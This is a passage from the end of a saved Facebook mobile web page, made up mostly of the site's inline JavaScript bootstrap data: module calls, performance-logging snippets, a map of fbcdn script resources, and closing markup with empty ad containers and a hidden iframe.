                    hbv: "8107691520116752411",
                  },
                ],
              ],
              [
                "NavigationMetrics@d48be8daf4d72c0512bdde9336186f16",
                "setPage",
                [],
                [
                  {
                    page: "/wap/index.php",
                    page_type: "normal",
                    page_uri:
                      "https://m.facebook.com/?rtime=1654722648&subno_key=AaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w&hrc=1&refsrc=deprecated&_rdr",
                    serverLID: "7106979666827724507-0",
                  },
                ],
              ],
              [
                "CavalryLoggerImpl@752c8b43c0f28b4d180bce0b0f9167f8",
                "startInstrumentation",
                [],
                [],
              ],
              ["Artillery@3c95c55bac0f3d27d3d5efe6f2e4852d", "disable", [], []],
              [
                "ServiceWorkerURLCleaner@e3f7e3947e707de9471c38ca2698afb4",
                "removeRedirectID",
                [],
                [],
              ],
            ],
          },
          hsrp: {
            hsdp: {
              clpData: { 1743095: { r: 1, s: 1 } },
              gkxData: {
                1652843: { result: false, hash: "AT6uh9NWRY4QEQoYfcY" },
              },
            },
            hblp: {
              consistency: { rev: 1005650017 },
              rsrcMap: {
                t1KEUNA: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yp/r/t__edt-vDoo.js?_nc_x=Ij3Wp8lg5Kz",
                },
                FEt5GzN: {
                  type: "js",
                  src: "https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yn/r/KWY7Edb5_DT.js?_nc_x=Ij3Wp8lg5Kz",
                },
              },
            },
          },
          allResources: ["t1KEUNA", "M5XDl+E", "FEt5GzN", "MOwxiEu", "58kqqKw"],
          onload: [
            'CavalryLogger.getInstance("7106979666827724507-0").setTTIEvent("t_domcontent");',
          ],
          onafterload: [
            'window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp("t_paint");',
            'if (window.ExitTime){CavalryLogger.getInstance("7106979666827724507-0").setValue("t_exit", window.ExitTime);};',
          ],
        });
      });
    </script>
    <div class="AdBox Ad advert post-ads"></div>
    <div class="dfp_unit"></div>
    <iframe srcdoc="" style="display: none"></iframe>
  </body>
</html>
